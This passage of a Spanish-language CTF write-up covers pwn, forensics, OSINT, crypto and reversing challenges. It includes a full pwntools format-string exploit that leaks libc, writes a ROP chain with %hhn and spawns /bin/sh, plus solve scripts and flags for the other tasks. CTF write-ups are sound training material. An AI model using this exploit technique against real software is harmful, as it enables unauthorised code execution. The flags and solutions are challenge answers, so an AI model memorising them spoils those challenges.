Juntando todo lo anterior usar %{offset_stack_1}${padding}x%{offset_stack_2}hhn nos permite imprimir un byte con el valor especificado en 'padding' en la dirección offset_stack_2.

Bien, ahora llevándolo a nuestro caso, para evitar que el valor almacenado no supere nunca el padding debemos escoger un offset_stack_1 que tenga sus 4 bytes más significativos en 0 (offset 57 servirá) y dado que nuestra entrada comienza en el offset 9(posicion 10 porque $ comienza con indice 1) y será un poco larga usaremos 24 bytes (3 offsets), por lo que la dirección a la que escribiremos se almacenará en offset 12(posicion 13).

+ Se ignorará el solicitar un padding para los bytes nulos puesto que no lo requieren
+ Se usará ljust para ajustar las cadenas de formato a direcciones de memoria completas

Solo queda hacer ROP, haremos una llamada a system("bin/sh"):

``` python
# solve.py
from pwn import *

exe = context.binary = ELF('./chall')
libc = exe.libc
io = process(exe.path)

# 1. Inspeccionar el stack
io.sendlineafter(b">> ",b"%10p"*90)  
stack = io.recvline(False)
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]


# 2. Obtener libc base y direccion de retorno a la direccion anterior al valor de offset 0
libc_base = u64(stack[60]) - 0x29D90
libc.address = libc_base
ret_addr = u64(stack[6]) - 0x120


# 3. ROP
rop = ROP([exe,libc])
rop.raw(rop.ret.address)                            # Alinear el stack  
rop.call("system",[next(libc.search(b"/bin/sh"))])
chain = rop.chain()

for i in range(len(chain)):
    p = b""
    if chain[i] != 0:
        p += f"%57${chain[i]}x".encode()
    p += b"%13$hhn"
    p = p.ljust(24, b"_")                   
    p += p64(ret_addr + i)
    io.sendlineafter(b">> ", p)

s = b"%s".ljust(8,b"_")
io.sendlineafter(b">> ",s)                        # Provocar el retorno y con ello la llamada a nuestro codigo
io.interactive()
```

``` 
python3 solve.py 
[*] '/home/kalcast/Descargas/reverb/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/kalcast/Descargas/reverb/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/home/kalcast/Descargas/reverb/chall': pid 33652
[*] Loaded 5 cached gadgets for './chall'
[*] Loaded 219 cached gadgets for '/home/kalcast/Descargas/reverb/libc.so.6'
[*] Switching to interactive mode
$ whoami
kalcast
$  
```


## Forensic 

### Too Hidden

Tenemos una captura de red y observándola con wireshark o tshark lo único relevante son unos paquetes ICMP

![icmp](https://github.com/user-attachments/assets/05aa0422-be80-43d8-9af3-e397f6389422)

Todos tienen la misma extensión y tipo, lo único que cambia son los dos bytes de Data y por supuesto los checksums. Los dos bytes de Data forman un patrón representado con tres valores (32, 45 y 46). Estos valores llevados de decimal a ASCII representan los caracteres 'SPACE', '-' y '.'. Esto es código [Morse](https://en.wikipedia.org/wiki/Morse_code)

Extraemos cada valor y lo convertimos a ASCII, para eso usé este (no muy bello) one-liner en bash

``` bash
 tshark -r chall.pcapng -x | grep -E '*f\.*[0-9]{2}' | tr '.' ' '| awk {'print $15'} | while read -r line; do for decimal in $line; do printf \\$(printf '%03o' $decimal); done; done
 .-- .-- ..-.  .... --- .-.. -.-- ..--.- ... .... . . . . - ..--.- -.-- --- ..- ..--.- -.-. .- -. ..--.- ..-. .. -. -.. ..--.- -- . ..--.- ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--..
```

Decodificamos el codigo Morse y obtenemos la flag

![holly](https://github.com/user-attachments/assets/70844a9c-9380-4109-ac43-b9924e237a86)

`WWF{HOLYSHEEEET_YOU_CAN_FIND_ME??????????}`


## OSINT

### Bulletproof

Primero que todo nos dan la imagen que tenemos que investigar y tratar de encontrar en que dirección se encuentra.

![image1](https://github.com/user-attachments/assets/9fc5b0ad-61ad-47d8-9992-76e04eabf9ef)

Realizar una busqueda inversa de la imagen lleva a una publicación de una compañía hablando sobre cristales blindados en estaciones de gasolina, aquí podemos llegar a la conclusión de que el local que estamos buscando es una de estas, probablemente de la compañía Shell ya que el esquema de colores que se ve en el cartel con el número “4” (rojo y amarillo) corresponde a esta compañía

Al observar de cerca algunos detalles en la foto se pueden ver en el cristal hay unas letras, al aplicar efecto espejo a la imagen para hacerlas legibles se ven una dirección y un número teléfonico que no se logran leer con total claridad

![image4](https://github.com/user-attachments/assets/cd2eab17-4fa1-4e3f-93d7-0e51fc2c9c3d)

De aquí se puede sacar un codigo zip (98405) que pertenece a Central Tacoma lo que reduce el área de búsqueda a esta zona

![Image5](https://github.com/user-attachments/assets/2a697ba6-2696-4177-8ffd-0bbc55a813b5)

Usando Google Maps se busca Shell Gas Station en esa zona y al observar los detalles de algunas de ellas podemos ver claramente que la dirección y el número teléfonico de una de ellas, corresponden con los antes encontrados en la imagen.

![image3](https://github.com/user-attachments/assets/a0f34d9a-3040-4efe-adb3-b74bb8c0103d)

FLAG: `wwf{3907s12thst_tacoma_wa98405_usa}`


## Crypto

### EpsilionDH

En el código vemos que hay un algoritmo similar a Diffie-Hellman pero con la diferencia de que la base usada no es un número entero, sino un objeto de la nueva clase Epsilon.

Acerca de la clase podemos decir que es una tupla (a,bε) o más bien un binomio de la forma a+bε.

Métodos de la clase

__init__: Es el constructor de clase, toma dos parametros, a y b.

\_\_add\_\_: Es la operación suma del binomio, que se mantiene igual al álgebra convencional (a,bε) + (c,dε) = (a+c,(b+d)ε).

\_\_radd\_\_: Es la operación suma reflexiva (esto es para el manejo del operador + en python cuando se suma un objeto Epsilon con algun entero).

\_\_mul\_\_: Es la operación multiplicación del binomio, pero con algo particular.

\_\_rmul\_\_: Es la operación multiplicación reflexiva (esto es para el manejo del operador * en python cuando se multiplica un objeto Epsilon por algun entero).

\_\_mod\_\_: Es la operación módulo del binomio, se define como (a,bε) % c = (a%c,bε%c)

\_\_repr\_\_: Es la representación de la tupla (a+bε).

getRandomBits: Un método propio de la clase, con Epsilon.getRandomBits(n) se crea un objeto Epsilon con coeficientes de n dígitos.


``` python3 
# chall.py
def powm(b, e, m):
    r = 1
    while e > 1:
        if e & 1:
            print("right")
            r = (r * b) % m
        b = (b * b)  % m
        e >>= 1
    return (b * r) % m

ɛ = Epsilon(0, 1)
g = ɛ.getRandomBits(1024)
m = bytes_to_long(flag)
assert m < p
A = powm(g, m, p)
```

Podemos ver como se usa crea el objeto Epsilon g, la bandera m y el numero primo p para realizar una exponenciacion modular rapida en la funcion powm. 

```
cat out.txt
p = 173924944755645003178406095718617168013285320974193311533464918516351624141198287888308296721497553891802368640344837769848433705383843820088678374708528763495103734488139368870389319280613181418960926879728892929013723036956818870578758055144789952650214552781344528622703875374067812710366180881422848078127
g = 153222010878956025592659771364999461265827693159532862299380012549533704470078014065110463612108844661289052080113198166134196684645743591092035461757997498335465019478118882739217108862526250347939116529661007420054504044554198442479469991584947626223020239910145162698053768142977329057860163194054350707249 + 172891042743500566967040288858220451145776247635832845268756172370398885506225014595399937064138727095012954778403481826951857306135326675358326250562011754152669045113179084291737802426967956129601732530346663460456772733886633658030480267226610996560624379249886941665142384623344612516572694197005870648544ɛ
A = 111358852433093434730054197107140594544307303976075171645711474646957878889456280742672183479878216988442037548855367380131019369757301409440037291726826948896290153981733240859717678222235993520619121828503359668550259222802623131077882382174117682287404839404525320091636778728025592053329591735052259548204 + 45354415949210290456746549581237886628185346518296265188224888250560968013577364380436312628842962917052795341010011570997705657164666282067908433629612354440756444902895692385443905786057605548586533595209894409891955713650856537806150873335015064767898088756645985769501205659617651498842444073593828856739ɛ
```

Tenemos p, g y A y debemos obtener m sabiendo que gᵐ mod p = A.

Para eso revisaremos la funcion de multiplicacion del binomio:

``` python3
   def __mul__(self, other):
        if type(other) == int: other = Epsilon(other, 0)
        return Epsilon(self.a * other.a, self.a * other.b + other.a * self.b)
```

***Analisis de la multiplicacion e idempotencia***

Como sabemos la multiplacion de dos binomios lineales da como resultado un trinomio, donde la variable (en este caso ε) deberia estar elevada al cuadrado en un monomio, pero esto no se cumple, la clase no tiene alguna forma de manejar estos trinomios, por lo que se puede decir que en este tipo de algebra ε es idempotente (ε²=0).

Se esperaria que: (a + bε) * (c + dε) = ac + adε + bcε + bdε²

Entonces debería quedar que: (a,bε) * (c,dε) = (ac,(ad+bc+bdε)ε) 

Pero dada la definición de la función aquí quedaría: (a,bε) * (c,dε) = (ac,(ac+bd)ε); por lo tanto ε²=0

Lo mas importante aqui es que, dado el teorema del binomio de Newton: (a + b)ⁿ = ∑ₖ₌₀ⁿ

![binomio](https://github.com/user-attachments/assets/0da09a62-4ad0-45ab-8f92-7f4eb161613a)

Pero gracias a que εⁿ=0; n > 1 se reduce todo a los dos primeros monomios:

```
(a+bε)² = a² + 2abε 

(a+bε)³ = a³ + 3a²bε 

(a+bε)⁴ = a⁴ + 4a³bε

(a+bε)ⁿ = aⁿ + naⁿ⁻¹bε
```

***Explotando la debilidad del sistema***

Encontrar m por fuerza bruta para un modulo primo p de 1024 dígitos no es viable, pero con un poco de matemáticas podemos ver otra salida. Extraeremos las partes de A y de g:

``` python3
from Crypto.Util.number import inverse, long_to_bytes

p = 173924944755645003178406095718617168013285320974193311533464918516351624141198287888308296721497553891802368640344837769848433705383843820088678374708528763495103734488139368870389319280613181418960926879728892929013723036956818870578758055144789952650214552781344528622703875374067812710366180881422848078127


g_str = '153222010878956025592659771364999461265827693159532862299380012549533704470078014065110463612108844661289052080113198166134196684645743591092035461757997498335465019478118882739217108862526250347939116529661007420054504044554198442479469991584947626223020239910145162698053768142977329057860163194054350707249 + 172891042743500566967040288858220451145776247635832845268756172370398885506225014595399937064138727095012954778403481826951857306135326675358326250562011754152669045113179084291737802426967956129601732530346663460456772733886633658030480267226610996560624379249886941665142384623344612516572694197005870648544ɛ'

A_str = '111358852433093434730054197107140594544307303976075171645711474646957878889456280742672183479878216988442037548855367380131019369757301409440037291726826948896290153981733240859717678222235993520619121828503359668550259222802623131077882382174117682287404839404525320091636778728025592053329591735052259548204 + 45354415949210290456746549581237886628185346518296265188224888250560968013577364380436312628842962917052795341010011570997705657164666282067908433629612354440756444902895692385443905786057605548586533595209894409891955713650856537806150873335015064767898088756645985769501205659617651498842444073593828856739ɛ'


g_parts = g_str.split(' + ')
g_a = int(g_parts[0].strip())
g_b = int(g_parts[1].strip()[:-1]) 

A_parts = A_str.split(' + ')
A_a = int(A_parts[0].strip())
A_b = int(A_parts[1].strip()[:-1])  
```

Por todo lo anteriormente explicado:
```
  A = gᵐ mod p =  (g_aᵐ mod p, m ⋅ g_a⁽ᵐ⁻¹⁾ ⋅ g_b mod p) 

```

Sacamos dos valores k y d:
```
  k = m ⋅ g_a⁽ᵐ⁻¹⁾ ⋅ g_b mod p ⋅ g_a) mod p  
  k = m ⋅ g_b ⋅ g_aᵐ (mod p) 

  d = g_aᵐ mod p ⋅ g_b) mod p
  d = g_b ⋅ g_aᵐ mod p
```

``` python3
k = (A_b * g_a) % p                                                     
d = (A_a * g_b) % p  
```

Como vemos k y d comparten los factores g_b y g_aᵐ, o sea que 'dividir' k por d, o lo que es lo mismo, multiplicar k por el inverso multiplicativo de d en modulo p, nos permtiria simplificar y obtener m:
```
 k * d⁻¹ mod p = m 
```

Listo, con esto solo queda convertir el numero m a bytes y obtener la flag:
``` python3
# solve.py
from Crypto.Util.number import inverse, long_to_bytes

p = 173924944755645003178406095718617168013285320974193311533464918516351624141198287888308296721497553891802368640344837769848433705383843820088678374708528763495103734488139368870389319280613181418960926879728892929013723036956818870578758055144789952650214552781344528622703875374067812710366180881422848078127


g_str = '153222010878956025592659771364999461265827693159532862299380012549533704470078014065110463612108844661289052080113198166134196684645743591092035461757997498335465019478118882739217108862526250347939116529661007420054504044554198442479469991584947626223020239910145162698053768142977329057860163194054350707249 + 172891042743500566967040288858220451145776247635832845268756172370398885506225014595399937064138727095012954778403481826951857306135326675358326250562011754152669045113179084291737802426967956129601732530346663460456772733886633658030480267226610996560624379249886941665142384623344612516572694197005870648544ɛ'

A_str = '111358852433093434730054197107140594544307303976075171645711474646957878889456280742672183479878216988442037548855367380131019369757301409440037291726826948896290153981733240859717678222235993520619121828503359668550259222802623131077882382174117682287404839404525320091636778728025592053329591735052259548204 + 45354415949210290456746549581237886628185346518296265188224888250560968013577364380436312628842962917052795341010011570997705657164666282067908433629612354440756444902895692385443905786057605548586533595209894409891955713650856537806150873335015064767898088756645985769501205659617651498842444073593828856739ɛ'


g_parts = g_str.split(' + ')
g_a = int(g_parts[0].strip())
g_b = int(g_parts[1].strip()[:-1])  # Remover la 'ɛ' al final

A_parts = A_str.split(' + ')
A_a = int(A_parts[0].strip())
A_b = int(A_parts[1].strip()[:-1])  # Remover la 'ɛ' al final

# Calcular k y d
k = (A_b * g_a) % p
d = (A_a * g_b) % p

# Hallar el inverso multiplicativo de d en mod p
d_inv = inverse(d, p)

# Hallar la flag
m = (k * d_inv) % p

# Decodificar la flag
flag_bytes = long_to_bytes(m)

try:
    flag = flag_bytes.decode('utf-8')
    print('Flag:', flag)
except UnicodeDecodeError:
    print('Fallo al decodificar, bytes obtenidos: ')
    print(flag_bytes)
```

```
 python3 solve.py
Flag: wwf{3psil0n_1s_k1dn4_0P}
```

`wwf{3psil0n_1s_k1dn4_0P}`


### Just Lattice

El esquema de cifrado de aprendizaje con errores (LWE) es un sistema criptográfico basado en celosía con los siguientes componentes matemáticos clave:

[Original](https://yun.ng/c/ctf/2024-wwctf/crypto/just-lattice)

```python
from tqdm import tqdm
import numpy as np

P = [...]
C = [...]


P = np.array(P)
C = np.array(C)
q = 127
n = 3


def enc(P, M, q):
    N = P.shape[0]
    n = len(M)
    r = np.random.randint(0, 2, (n, N))
    Z = np.zeros((n, P.shape[1]), dtype=np.int32)
    Z[:, 0] = 1
    C = np.zeros((n, P.shape[1]), dtype=np.int32)
    for i in range(n):
        C[i] = (np.dot(P.T, r[i]) + (np.floor(q/2) * Z[i] * M[i])) % q
    return C


def dec(C, s, q):
    M = np.zeros(len(C), dtype=np.int32)
    for i in range(len(C)):
        M[i] = round((np.dot(C[i], s) % q) * (2/q)) % 2
    return M


def crack_n1_lwe(P, q, num_samples=200):
    known_messages = np.random.randint(0, 2, num_samples)
    ciphertexts = enc(P, known_messages, q)
    best_success = 0
    best_ts = []
    for potential_ts in tqdm(range(q**n)):
        potential_ts = np.unravel_index(potential_ts, (q,) * n)
        potential_s = np.concat((np.array([1]), np.array(potential_ts)))
        success_count = 0
        decrypted = dec(ciphertexts, potential_s, q)
        success_count = np.sum(known_messages == decrypted)
        if success_count > best_success:
            best_success = success_count
            best_ts = potential_ts
        if success_count == num_samples:
            break
    recovered_s = np.concat((np.array([1]), np.array(best_ts)))
    success_rate = best_success / num_samples
    return recovered_s, success_rate


print(f"{q=}")
recovered_s, success_rate = crack_n1_lwe(P, q)
print(recovered_s, success_rate)
M = dec(C, recovered_s, q)


def unprep(s):
    s = ''.join([str(b) for b in s])
    return ''.join([chr(int(s[i:i+8], 2)) for i in range(0, len(s), 8)])


print(unprep(M))
```
```
wwf{1f_y0u_5qu33z3_17_h4rd_3n0u6h_ju1c3_w1ll_c0m3_0u7}
```


## Reversing

### Ransom Waifu

[deobfuscate](https://obf-io.deobfuscate.io/)
Remueve el código muerto

Te darás cuenta que solo una función es relevante.
```js
function check(_0x266792) {
    ...
}
```

Al decifrar las base64 te darás cuenta de que todas estas cadenas base64 son en realidad operadores realizados en una pila.

El significado de `xy` ypuede ser obvio o no, pero está bien, pasaremos a la siguiente parte.
```js
function check(flag) {
    const arr1 = [3, 0, 4, 0, 5, '0', '3', '0', ...];
    const arr2 = ["CzhQSPrjvxQ7vfEm", "spCiy27WpEuz0bAh", ...];
    const operators = {
        CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
            '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
            '        return b[a]\r\n' +
            '    }',
    ...
    };
    const arr3 = ["d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", 17, 19, "length", ...];
    const arr4 = [];
    for (let i = 0; i < flag.length; i++) {
        arr3[i] = flag[i];
    }
    function func(i) {
        arr3.push(i);
        return arr3.length - 1;
    }
    arr1.forEach(el => {
        if (typeof el === "string") {
            const op = eval('(' + operators[arr2[parseInt(el)]] + ')');
            arr4.push(func(op(arr4, arr3)));
        } else {
            arr4.push(el);
        }
    });
    return arr3[arr4.pop()];
```
¿Cuales son los significados de las matrices?

```js
function func(i) {
    arr3.push(i);
    return arr3.length - 1;
}
arr1.forEach(el => {
    if (typeof el === "string") {
        const op = eval('(' + operators[arr2[parseInt(el)]] + ')');
        arr4.push(func(op(arr4, arr3)));
    } else {
        arr4.push(el);
    }
});
```
Aquí puede observar que los operadores del paso anterior se utilizan con `arr4` y `arr3` como entrada. Los nuevos datos producidos se agregan a `arr3` y el índice se envía a `arr4`. Además, en los operadores, `arr3` se accede a través de indexadores desde `arr4`. Podemos deducir que `arr4` almacena índices en valores en `arr3`.

`arr2` Por otro lado, parece almacenar solo todas las claves de los operadores, lo que significa `parseInt(el)` que dará como resultado un operador, lo que significa que `arr1` es muy probable que sea una pila de operadores. Sin embargo, si `el` no es una cadena int, parece almacenar valores utilizados, `arr4` lo que significa `arr1` que almacena tantos operadores como `arr3` índices.

- Todos los datos reales están en `arr3`, llamémoslo `mem`.
- `arr2` son solo operadores, se pueden llamar `ops`.
- `arr1` es un operador índices + índices de memoria, se puede llamar `prog`.
- `arr4` se utiliza puramente como una pila, se puede llamar `stack`.
```js
function check(flag) {
    const prog = [3, 0, 4, 0, 5, '0', '3', ...];
    const ops = ["CzhQSPrjvxQ7vfEm", "spCiy27WpEuz0bAh", ...];
    const operators = {
        CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
            '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
            '        return b[a]\r\n' +
            '    }',
        ...
    }
    const mem = ["d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", 17, 19, ...];
    const stack = [];
    for (let i = 0; i < flag.length; i++) {
        mem[i] = flag[i];
    }
    function store_in_mem(i) {
        mem.push(i);
        return mem.length - 1;
    }
    prog.forEach(el => {
        if (typeof el === "string") {
            const op = eval('(' + operators[ops[parseInt(el)]] + ')');
            stack.push(store_in_mem(op(stack, mem)));
        } else {
            stack.push(el);
        }
    });
    return mem[stack.pop()];
}
```
Ahora necesitamos decodificar realmente lo qué `prog` almacena.

Podemos usar ganchos o simplemente hacer que todos los operadores devuelvan cadenas.

Dos de las funciones pueden parecer complicadas, pero si las pruebas, son solo suma y resta.

```js
const operators = {
    CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
        '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
        '        return `${b}[${a}]`\r\n' +
        '    }',
    spCiy27WpEuz0bAh: 'function (x, y) {\r\n        return `${y[x.pop()]}.charCodeAt(0)`\r\n    }',
    mTvc3QBx6ieTIzEA: 'function (x, y) {\r\n        return `!${y[x.pop()]}`\r\n    }',
    I4TO8mHsfL6Tic7v: 'function (x, y) {\r\n' +
        '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
        '        return `${b} % ${a}`\r\n' +
        '    }',
        ...
};
```
Ahora ejecútalo pero con los argumentos incluidos.
```js
console.log(check(["'wwf{flag}'", '[155, 25, 81, 18, 37, 247, 169, 26]', '[239, 17, 117, 197, 235, 182, 242, 83]']))
```
¡Ahora tenemos el programa real!

***Solución***
```js
const operators = {
    CzhQSPrjvxQ7vfEm: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (Array.isArray(b)) {
            if (!b[a]) console.log(b, a)
            return b[a]
        }
        if (a === 'length') return `${b}.length`
        return `${b}[${a}]`
    },
    spCiy27WpEuz0bAh: function (x, y) {
        return `${y[x.pop()]}`
    },
    mTvc3QBx6ieTIzEA: function (x, y) { return `!${y[x.pop()]}` },
    I4TO8mHsfL6Tic7v: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return b % a;
        return `(${b} % ${a})`
    },
    UpIk0FsWtwynGyBU: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a * b;
        return `(${a} * ${b})`
    },
    HGP5hbB7yJzI2iuN: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return 1 / (a / b);
        return `(${b} / ${a})`
    },
    '8ZuAtV6T1A4EaCzU': function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a + b;
        return `(${a}+${b})`
    },
    GkzKiFsahtTuIhWZ: function (x, y) {
        let b = y[x.pop()], a = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a - b;
        return `(${a} - ${b})`
    },
    iGXbPUsu9ti82rZ3: function (x, y) { return `(${y[x.pop()]} === ${y[x.pop()]})` },
    Ajsp9ey55YxDO6Dh: function (x, y) { return `(${y[x.pop()]} !== ${y[x.pop()]})` },
    CTI3do19ytT13s0V: function (x, y) { return `(${y[x.pop()]} & ${y[x.pop()]})` },
    Iv1du7HLwfTBhC33: function (x, y) { return `(${y[x.pop()]} ^ ${y[x.pop()]})` },
    FVGaT0YAtvEnrh1L: function (x, y) { return `(${y[x.pop()]} | ${y[x.pop()]})` },
    mDA2bNR6EFYLd7Zp: function (x, y) { return `(${y[x.pop()]} && ${y[x.pop()]})` },
    tVd8iQXoWejgiKNZ: function (x, y) { return `(${y[x.pop()]} || ${y[x.pop()]})` }
}
```
El programa se verá así después de sustituir el valor y reformatear.

```js
((4991038 === (194 * ((198 + (117 * (81 ^ (flag[(36 % flag.length)] +
    flag[(37 % flag.length)])))) ^ ((117 + (81 * (
    flag[(38 % flag.length)] ^ flag[(37 %
        flag.length)]))) ^ 123)))) && ((342408 === (88 * ((80 + (
    17 * (25 ^ (flag[(35 % flag.length)] +
        flag[(36 % flag.length)])))) ^ ((17 + (
    25 * (flag[(37 % flag.length)] ^ flag[
        (36 % flag.length)]))) ^ 16)))) && ((59685 === (1 * ((
    230 + (239 * (155 ^ (flag[(34 % flag
        .length)] + flag[(35 %
        flag.length)])))) ^ ((239 + (155 * (
    flag[(36 % flag.length)] ^
    flag[(35 % flag.length)]))) ^ 193)))) && ((452012 ===
    (44 * ((74 + (83 * (26 ^ (flag[(33 % flag
        .length)] + flag[(34 %
            flag.length)])))) ^ ((83 + (26 * (
        flag[(35 % flag.length)] ^
        flag[(34 % flag.length)]))) ^ 171)))) && ...
```
Conectándolo al z3 obtendrá la bandera.


```
wwf{m45h1r0_w41fu_>_<_50_cu73~~_4hw4_}
```

![1](/assets/posts/WorldWideCTF2024/2.png)
